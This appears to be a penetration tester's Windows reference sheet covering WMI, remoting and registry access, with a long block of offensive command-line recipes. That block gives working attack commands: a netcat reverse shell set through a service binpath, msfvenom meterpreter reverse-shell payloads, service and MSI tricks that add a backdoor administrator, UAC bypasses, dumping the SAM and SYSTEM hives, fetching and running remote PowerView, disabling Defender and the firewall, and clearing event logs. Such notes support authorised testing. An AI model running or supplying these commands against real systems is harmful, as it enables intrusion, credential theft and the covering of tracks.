### Useful WMI Classes 

- Win32_OperatingSystem
- Win32_Process
- Win32_IP4RouteTable
- Win32_UserAccount
- Win32_Groups
- Win32_ShadowCopy
  - Create a shadow copy of AD's drive and extract NTDS.dit
  - ```
    (Get-WmiObject -Class Win32_ShadowCopy -list).create("C:\", "CreateAccessible")
    $link = (Get-WmiObject -Class Winn32_ShadowCopy).DeviceObject + "\"
    cmd /c mklink /d C:\shadowcopy "$link"
    ```
- AD

### Tools

- WMI Object Browser:
- WMIC

```powershell
# WMIC Verbs can be explored by looking at help 

# Interactive 
wmic 
wmic:root\cli> process /?
wmic:root\cli> group where name='Administrators' assoc

# Non-interactive 
wmic process /?
```

- Powershell WMI Browser
- WMI Code Generator 
- WMIGen

### Remoting 

- WMI Cmdlets  
  - Uses DCOM 
  - Port 135 (winmgmt service)
  - Not firewall / NAT friendly 
  - Data exchanged on dynamic ports (`HKLM\Software\Microsoft\Rpc\Internet`)
- CIM Cmdlets 
  - DCOM 135
  - WinRm/WSMan
    - 5385 - HTTP
    - 5386 - HTTPS
    - Firewall and NAT friendly 

Session over WinRM/WSMan:
```powershell
$sess = New-CimSession -ComputerName <name> -Credential <cred>
Get-CimInstance -CimSession $sess -ClassName Win32_OperatingSystem
```

Session over DCOM:
```powershell
$sessOptions = New-CimSessionOption -Protocol Dcom
$newsess = New-CimSession -ComputerName <name> -Credential <cred> -SessionOption $sessOptions
```

### Access Registry

```powershell
Get-WimObject -Namespace root\default -Class StdRegProv -List

Get-WimObject -Namespace root\default -Class StdRegProv -List | Select-Object -ExpandProperty methods | more

$RegProv = Get-WimObject -Namespace root\default -Class StdRegProv -List 
$RegProv.Methods 
```

```powershell
$RemoteReg = Get-WmiObject -List "StdRegProv" -ComputerName <name> -Credential <cred>
$RemoteReg | Select-Object -ExpandProperty methods | more
$RemoteReg.getStringValue(<id>, <path>, <propertyName>)
```

```powershell
WmiInvokeMethod -Namespace root\default -Class StdRegProv -Name GetStringValue @(<id>,<path>,<property>)
```

```powershell
Posh_SecMod \ Registry.ps1 
```

### References

- [Playing with MOF files on Windows, for fun & profit](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html)
- [Exposing System Secrets with VBA and WMI API](https://sites.google.com/site/beyondexcel/project-updates/exposingsystemsecretswithvbaandwmiapi)
- [How to use WbemExec for a write privilege attack on Windows](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows)

## AppLocker

- <https://github.com/api0cradle/UltimateAppLockerByPassList>

## HyperV

- Fuzzing para-virtualized devices in Hyper-V: <https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/>
- Writing a Hyper-V "Bridge" for Fuzzing — Part 1: WDF: <http://www.alex-ionescu.com/?p=377>
- Writing a Hyper-V "Bridge" for Fuzzing — Part 2 : Hypercalls & MDLs: <http://www.alex-ionescu.com/?p=471>
- <https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/>
- <https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/>
- <https://github.com/comaeio/LiveCloudKd>

## Events

**Tools**

- EtwExplorer - View Event Tracing for Windows (ETW) Provider manifests: <https://github.com/zodiacon/EtwExplorer>

## Defense 

- Disable Windows Defender: `Set-MpPreference -DisableRealtimeMonitoring $true`
- Windows 10 and Server 2016 Secure Baseline Group Policy: <https://github.com/mxk/win10-secure-baseline-gpo>
- Preventing Mimikatz Attacks by Panagiotis Gkatziroulis: <https://hakin9.org/preventing-mimikatz-attacks/>
- Server Security
  - <https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance>

## References

- Schtasks without Schtasks.exe via Reflective DLL: <https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/>
- Windows 10 Persistence via PATH directories - CDPSvc: <https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html>
  - CDPSvc (Connected Devices Platform Service) searches the file cdpsgshims.dll inside PATH directories and loads it if found.
  - With a default Windows installation, there can’t be a non-admin directory in the PATH, so this can’t be exploited.
  - A sample DLL (source included) that executes calc.exe is available here: <https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist>
- Useful for vulnerability research workflows on Windows: <https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203>
- Windows 10 Device Security: <https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu>
- Windows Command Line cheatsheet (part 1): some useful tips: <https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/>
- Windows Command Line cheatsheet (part 2): WMIC: <https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/>

### Kernel

- Kernel Internals - Windows Sandbox: <https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849>

## Troubleshooting

- RELI: Reliability History/Monitor
- Problem Steps Recorder (PSR): troubleshooting, assistance, screen capture, annotation tool
- PathPing: Details of the path between two hosts and the echo-location statistics for each node are displayed. 
  - tracert to the destination
  - ICMP to ping each hop 100 times
- My TraceRoute (MTR): identify issues between two routers responsible for overall latency
- Sysinternals: 
  - Process Explorer
  - PsExec PsList PsKill PsLoggedOn
  - Notmyfault: crash or handle kernel memory leaks
  - Autoruns
  - SDelete
- Windows Master Control Panel: gives you access to all the operating systems control panels within one folder.
  - Right-click your Windows 7, 8.1, or 10 desktop and choose New ➪ Folder.
  - Name the folder GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}.


### Random 

```bat
WINDOWS COMMANDS
 
BASIC
systeminfo
hostname
whoami
whoami /all
echo %username%
ipconfig /all
route print
netstat -ntlp
    -listening ports
netstat -bano
netsat -r
    -routing table
command | findstr /C:"str"
    -grep
echo %userdomain%
echo %path%
shutdown /r
start explorer
    -execute path builtin program (same as input to win+r)
env
set
path
    -print currently defined execution path
setx c:\Program Files(x86)\bin\
    -append target directory to currently defined execution path
runas /profile /user:administrator "C:\absolute\path\pcoff.exe"
    -run target "executable" with user profile permissiosn for /user:
        --*should prompt for target user's password
START /B process.exe
    run code excution in background
for %%i in (C:\abs\path\*) do %%i
    OR
for /F "usebackq" %i in (`dir /b C:\macros\Day\`) DO %i
    -execute all files in a directory
Auto-Start Directories
Windows NT 6.1,6.0
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
Windows NT 5.2, 5.1, 5,0
%SystemDrive%\Documents And Settings\All Users\Start Menu\Programs\StartUp\
Windows 9x
%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\
Windows NT 4.0, 3.51, 3.50
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\
   
FILESYSTEM
type file
    -print file
dir /s *pass* == *cred* == *vnc* == *.config*
dir \ /s /b | find /I “searchstring”
findstr /si password *.xml *.ini *.txt
fsutil fsinfo drives
    -list drives currently on the system
    --requires admin privs
assoc
    -print returned list of file extension associations
assoc .ps1=powershellfile
ftype powershellfile="%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
    -to set a default program for opening a given filetype associate an extension with a defined filetype value(which multiple extensions my be associated with), then set the default program to execute files of a given type with
dir /a-r-d /s /b
    -check directory for writeable files
powershell Get-ChildItem -Recurse | Get-Acl | out-string -stream | select-string -pattern "everyone"
    -check for world-writeable files
   
File Transfer  
iexplore.exe http://blah.com/filename.zip
C:\windows\explorer.exe http://somewhere.com/filename.ext
ftp ftp.site.dom
   
   
USERS
whoami
net users
net user /domain
    -list users in current domain
net user username
    -list user info
net user name pass /add
    -add local system user
net user user_name * /domain
    -add user to domain with interactive prompt for password
net user name setpword
net user /DOMAIN %USERNAME%
    -check user's network group membership
net user /domain user
    -check another user's information
net group "Domain Users" /domain
    -list users in AD group
net localgroup "administrators" /domain
    -list domain local group users
net group “Domain Admins” /domain
net group “Enterprise Admins” /domain
net group “Domain Controllers” /domain
NET LOCALGROUP "Remote Desktop Users" trinity /ADD
net accounts
    -prints password policy for locahost
net accounts /domain
dsmod user /?
    -get dsmod commands cruft
dsmod user administrator -pwd NewPassword -mustchpwd yes
    -modify user password, set pwExpired flag
 
 
NETWORK
arp -A
net view
    -view available network share hosts
net view \\HOST
    -view available shares on host
net view /domain:otherdomain
    Queries NBNS/SMB (SAMBA) and tries to find all hosts in ‘otherdomain’
tasklist /V /S computername
qwinsta /SERVER:computername
qprocess /SERVER:computername *
net use \\computername This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed
dir \\computername\share_or_admin_share\
net use \\computer\share
    -mount an smb share
net use X: \\10.2.2.224\C$
net use * http//hostname/nfs/ pword /USER:username
net share name=c:\path\to\share
    -create smb share
net share name=c:\path\to\share /GRANT:Everyone,FULL
    -make an smb share world-accessable
pushd \\10.2.2.224\C$
    -mount remote file share to automatically mapped drive
cacls c:\path\ /T /E /G user:f
    -grant user full file access control from path
tasklist /V /S computername
    Lists tasks w/users running those tasks on a remote system
netsh firewall show state
netsh firewall show config
netsh firewall set opmode disable
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
    -enable remote wmi
netsh interface ip set address local dhcp
    -configure nic to user dhcp
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
    -open port (for rdesktop)
netsh advfirewall firewall add rule name="Block mssql attack ips" dir=in action=block protocol=TCP localport=1433 remoteip=22.75.175.213
    -close port (for rdesktop)
netsh advfirewall set allprofiles state off
netsh wlan show profiles
    -shows all saved wireless profiles
netsh wlan export profile folder=. key=clear
    exports a user wifi profile with the password in plaintext to an xml file in the current working directory
netsh wlan [start|stop] hostednetwork
    Starts or stops a wireless backdoor on a windows 7 pc
netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent|temporary
    Complete hosted network setup for creating a wireless backdoor on win 7
netsh wlan set hostednetwork mode=[allow|disallow]
netdom query trust /Domain:dnsname
    OR
nltest /domain_trusts /All_Trusts
 
 
 
SERVICES/PROCESSES/PERMISSIONS && configuration
tasklist
tasklist /SVC
taskkill <pid>
net start
    -list all running services
sc [stop|start] service
sc qc service
    -view configuration of a service
    ->sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
    ->sc config upnphost obj= ".\LocalSystem" password= ""
    ->net start upnphost
sc query
sc queryex
schtasks /query /fo LIST /v
net start RpcSs
net stop RpcSs
    -start stop rpc service on localhost
c:\windows\system32\gathernetworkinfo.vbs
    (Windows 7)Included script with, enumerates builtin config information
pkgmgr /iu:"TelnetServer"
pkgmgr /iu:IIS-WebServerRole;WAS-WindowsActivationService;WAS-WindowsProcessModel; WAS-NetFxEnvironment;WAS-ConfigurationAPI
pkgmgr /uu:WAS-WindowsActivationService;WAS-WindowsProcessModel
    (On Vista) install update or uninstall update builtin process
icacls "dir\"
    -check the file permissions of a folder
 
WMIC
    WINDOWS MANAGEMENT INSTRUMENTATION
**default xp configuration does not allow low priv(non-members of administrators group) to wmic; w7/8 by default allow access to low priv users
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
https://blogs.technet.microsoft.com/heyscriptingguy/2014/09/13/weekend-scripter-the-wmi-explorer-tool/
    QUERIES
SELECT [Class property name|*] FROM [CLASS NAME] <WHERE [CONSTRAINT]>
SELECT * FROM Win32_Process WHERE Name LIKE “%chrome%”
    -wmic instance query
    INFORMATION
wmic /?
    WMIC enable (remote)
wmic startupwmic service
    -start remote wmi service
netsh firewall set service RemoteAdmin enable
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
    -make exception in firewall for remote wmic service
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM\CIMOM\AllowAnonymousCallback
Get-WmiObject -Namespace "root\cimv2" -Class Win32_LogicalDisk -ComputerName <REMOTE_IP> -Credential <DOMAIN\User>
    -test remote wmi access
    ENUMERATION
wmic qfe
    -patch level information
wmic qfe get
    -list patching information for localhost
wmic qfe qfe hotfixid
wmic qfe get Caption,Description,HotFixID,InstalledOn\
    -get windows patch level information
wmic process list full
    -list all attributes of all running processes
wmic process get caption,executablepath,commandline
wmic process call create “program”
wmic process where name=“program” call terminate
    -kill target program
wmic process get caption,executablepath,commandline /format:csv
wmic useraccount
wmic useraccount get /ALL
wmic useraccount where name='uname' get sid
wmic useraccount where sid='S-1-3-12-1234525106-3567804255-30012867-1437' get name
wmic useraccount where (name='administrator' and domain='%computername%') get name,sid
    -get name/sid for system admin
wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid
    -get name/sid for domain admin
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
    -check for trusted service paths(privesc)
wmic get /ALL /format:csv
wmic share get /ALL
    -list smb shares
wmic logicaldisk get name
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
wmic start list full
    -list startup programs
wmic computersystem get domain
wmic ntdomain list
    -domain and DC info
PRIVESC enumeration
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
    -find unquote service path
 
   
   
REGISTRY
*note HKLM keys are for HKey local machine registry
*HKCU keys are for HKey current user registry entries
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    -together allow users of any privilege level to install *.msi files as NT AUTHORITY\SYSTEM
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    -enable RDP
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
    -grep the registry for key word "password"
REG add "HKLM\SYSTEM\CurrentControlSet\services\RpcSs" /v Start /t REG_DWORD /d 2 /f
    -change startup type for rpc service to automatic
REG add "HKLM\SYSTEM\CurrentControlSet\services\RpcSs" /v Start /t REG_DWORD /d 4 /f
    -change startup type for rpc service to disabled
reg add
"HKEY_LOCAL_MACHINE\SYSTEM\Current ControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"
    -(win7) curely registered executables within the system registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    -windows autologin
reg query "HKCU\Software\ORL\WinVNC3\Password"
    -vnc stored password
reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
    -putty cleartext credentials
reg save HKLM\Security security.hive    --save security.hive
reg save HKLM\System system.hive    --save system hive to file
reg save HKLM\SAM sam.hive  --save sam to file
reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f && START /W CompMgmtLauncher.exe && reg delete HKEY_CURRENT_USER\Software\Classes\mscfile /f
    -UAC bypass for win 7/8/10
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f && START /W sdclt.exe && reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
    -UAC bypass for win 10
 
START>Administrative Tools>Server Manager>Features>Add Features>Administrative Tools>Windows Powershell
    -enable powershell on machine
POWERSHELL
syntax (from cmd.exe, where installed):
    Special Characters
" The beginning (or end) of quoted text
# The beginning of a comment
$ The beginning of a variable
& Reserved for future use
( ) Parentheses used for subexpressions
; Statement separator
{ } Script block
| Pipeline separator
` Escape character
    .\Powershell.exe -command <command> <parameter(s)>
    attrib +R c:\path\to\file.txt
    $var = "hello"
    Powershell.exe -command Get-HotFix
        -check Windows patch level
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-NetUser
        -display all AD users
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-UserProperties -Properties name,memberof,description,info
        -return AD user proprietary information
    set-ItemProperty -Path 'HKLM:\System\Current\ControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
        -format for making registry queries from powershell
        --enable RDP on target hostname
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
        -enable existing firewall rule, e.g. RDP allow
    powershell.exe -command New-NetFirewallRule -DisplayName "Allow Inbound Port 80" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
        -create new firewall rule set to allow
        --to create a block rule set -Action Block
    powershell.exe -command Get-Service
        -show all services
    powershell.exe -command Restart-Service
        -restart target service
    powershell.exe -command Get-Service Set-DNSClientServerAddress - InterfaceAlias "Ethernet" -ServerAddresses 8.8.8.8
        -Configure the DNS Server (to 8.8.8.8/Google)
    powershell.exe -command Get-Process
        -return a process listing
    Start-Job { 'C:\bin\hashcat\bin\hashcat64.exe' } -Name cracker
    bitsadmin /transfer jobname /download /priority normal http://hack.er/file.ext C:\Path\to\outfile.ext
        -download a file
        ACTIVE DIRECTORY cmdlets
    Get-Job -State
    Stop-Job cracker
    Get-Command *text*
    Get-Command -Verb Get
    Get-Command -Noun Service
    Get-Help Get-Command (-Detailed,-Full,-Examples,-Online)
        OR
    Get-Command -?
    Get-SmbServerConfiguration
    Set-SmbServerConfiguration -EnableSMB1Protocol $true
    Get-ChildItem -Path C:\path -Filter namedpipe.exe -Recurse -ErrorAction SilentlyContinue -Force
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-NetComputers
        -return listing of hosts in Active Directory
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-Information
        -return information collected on sys,reg,&c
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Invoke-Userhunter
        -search network for hosts in use by Domain Admin(s)
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Invoke-Userhunter -UserName "admin"
        -search network for host user "admin" is on
    get-aduser -filter {name -like "krbtgt*"} -prop Name,Created,PasswordLastSet,msDS-KeyVersionNumber,msDS-KrbTgtLinkB1
        -get information for krbtgt active directory domain account
    Get-ADForest | Select Domains
        -enum domains in an AD forest
    Get-ADDomain | FL NetBIOSName
        -get netbios name of an AD domain
    Get-ADTrust -filter *
 
Powershell x WMIC
    wmic.exe
Powershell WMI cmdlets
-- Get-WmiObject
-- Get-CimAssociatedInstance
-- Get-CimClass
-- Get-CimInstance
-- Get-CimSession
-- Set-WmiInstance
-- Set-CimInstance
-- Invoke-WmiMethod
-- Invoke-CimMethod
-- New-CimInstance
-- New-CimSession
-- New-CimSessionOption
-- Register-CimIndicationEvent
-- Register-WmiEvent
-- Remove-CimInstance
-- Remove-WmiObject
-- Remove-CimSession
Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential ‘WIN-B85AAA7ST4U\Administrator'
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
    -av detection
SELECT * FROM Win32_ComputerSystem WHERE TotalPhysicalMemory < 2147483648
SELECT * FROM Win32_ComputerSystem WHERE NumberOfLogicalProcessors < 2
SELECT * FROM Win32_NetworkAdapter WHERE Manufacturer LIKE “%VMware%”
SELECT * FROM Win32_BIOS WHERE SerialNumber LIKE “%VMware%”
SELECT * FROM Win32_Process WHERE Name=”vmtoolsd.exe”
SELECT * FROM Win32_NetworkAdapter WHERE Name LIKE “%VMware%”
    -vm detection
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ‘notepad.exe’
    -code execution, like psexec but stealthier
       
SYSINTERNALS
PSEXEC
psexec /?
psexec -accepteula
psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
psexec \\10.2.2.23 netsh firewall set service remoteadmin enable
psexec \\JAMES -u james -p FmyN3rZ37LNss2X netsh firewall set service remoteadmin enable
 
CLEANUP
wevtutil el
    -list logs
wevtutil cl log.log
    -clear specific lowbadming
del %WINFRT%\*.log /a /s /q /f
 
ADVANCED
DRIVERQUERY
 
LOCAL EXPLOITS
KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
-patch levels corresponding to most common windows privesc exploits for xp/vista/7/server2003-2008
KB2503665:
    patch level for afd.sys(40564) local exploit (xp sp3, server 2003 sp2, vista sp1/2, server 2008 sp1/2, 7 (sp0/1)
    Table of patch replacements:
#                               | MS11-046  | MS11-080  | MS12-009  | MS13-093  | MS14-040  |
#                               -------------------------------------------------------------
#                               | KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 |
#   -----------------------------------------------------------------------------------------
#   Windows x86 XP SP3          | Installed | <-Replaces|     -     |     -     |     -     |
#   Windows x86 Server 2003 SP2 | Installed | <-Replaces| <-Replaces|     -     | <-Replaces|
#   Windows x86 Vista SP1       | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 Vista SP2       | Installed |     -     |     -     |     -     | <-Replaces|
#   Windows x86 Server 2008     | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 Server 2008 SP2 | Installed |     -     |     -     |     -     | <-Replaces|
#   Windows x86 7               | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 7 SP1           | Installed |     -     |     -     |     -     | <-Replaces|
 
 
Policy files (may contain passwords)
SYSVOL/(../)Groups.xml
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes
 
 
Configuration files commonly left behind by mass rollouts/older (pre-)devops
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
 
Trusted Service Paths
    exploit/windows/local/trusted_service_path
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
icacls "C:\Program Files (x86)\Target"
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe
    -now replace Target\target.exe with payload
sc stop target
sc start target
    -now the reverse shell should be spawned as privileged user
 
Vulnerable Services
    exploit/windows/local/service_permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc qc target
sc config target binpath= "net user hacker P@ssword123! /add"
sc stop target
sc start target
sc config target binpath= "net localgroup Administrators hacker /add"
sc stop target
sc start target
    -errors may occur starting service, but only after commands are executed
 
AlwaysInstallElevated
    exploit/windows/local/always_install_elevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o exploit.msi
msiexec /quiet /qn /i C:\Users\User\Downloads\exploit.msi
 
DLL Injection
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe
 





WIN filesystem read targets
 
tier 1
%SYSTEMDRIVE%\boot.ini
    near ubiquitous, confirmation that a read is happening
%WINDIR%\win.ini
    second test file if boot.ini cannot be found/returned
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
    stores users' passwords in a hashed format (in LM hash and NTLM hash). The SAM file in \repair is locked, but can be retired using forensic or Volume Shadow copy methods
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\system
    key to read SAM hashes in plaintext without cracking
%WINDIR%\repair\security
%SYSTEMDRIVE%\autoexec.bat
 
TIER 1, LOCATION NOT SET BY DEFAULT
unattend.txt
unattend.xml
sysprep.inf
    --(ALL)Used in the automated deployment of windows images and can contain user accounts. No known default location.
 
tier 2
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\software
%WINDIR%\iis6.log
    (or 5 or 7, given version)
%WINDIR%\system32\logfiles\httperr\httperr1.log
    --iis6 error log
%SystemDrive%\inetpub\logs\LogFiles
    --IIS 7’s logs location
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts



references
http://www.fuzzysecurity.com/tutorials/16.html
https://www.toshellandback.com/2015/11/24/ms-priv-esc/


https://pastebin.com/FehvXsEZ
https://pastebin.com/HvKs18zh
```